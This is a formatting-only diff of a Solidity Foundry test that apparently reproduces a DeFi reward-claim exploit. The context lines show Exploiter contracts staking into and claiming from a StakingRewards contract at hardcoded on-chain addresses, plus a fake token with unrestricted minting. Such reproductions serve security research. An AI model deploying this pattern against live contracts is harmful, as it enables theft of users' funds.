@@ -64,7 +64,9 @@ contract ContractTest is Test {
         );
     }
 
-    function stakeFactory(uint256 amount) internal {
+    function stakeFactory(
+        uint256 amount
+    ) internal {
         address account;
         for (uint256 i; i < amount; i++) {
             exploiter = new Exploiter();
@@ -101,7 +103,9 @@ contract ContractTest is Test {
         QIQI.transfer(address(Pair), 10_100 * 1e18);
     }
 
-    function claimFactory(uint256 amount) internal {
+    function claimFactory(
+        uint256 amount
+    ) internal {
         for (uint256 i; i < amount; i++) {
             exploiter = Exploiter(expoiterList[i]);
             exploiter.claim(address(TokenA));
@@ -115,12 +119,16 @@ contract Exploiter {
     IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
     IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);
 
-    function stake(address account) external {
+    function stake(
+        address account
+    ) external {
         USDT.approve(address(StakingRewards), USDT.balanceOf(address(this)));
         StakingRewards.stake(address(QIQI), address(SELLC), address(USDT), account, USDT.balanceOf(address(this)));
     }
 
-    function claim(address _recipient) external {
+    function claim(
+        address _recipient
+    ) external {
         StakingRewards.claim(address(QIQI), _recipient);
         QIQI.transfer(msg.sender, QIQI.balanceOf(address(this)));
     }
@@ -158,13 +166,17 @@ contract TOKENA {
         return true;
     }
 
-    function mint(uint256 amount) external {
+    function mint(
+        uint256 amount
+    ) external {
         balanceOf[msg.sender] += amount;
         totalSupply += amount;
         emit Transfer(address(0), msg.sender, amount);
     }
 
-    function burn(uint256 amount) external {
+    function burn(
+        uint256 amount
+    ) external {
         balanceOf[msg.sender] -= amount;
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
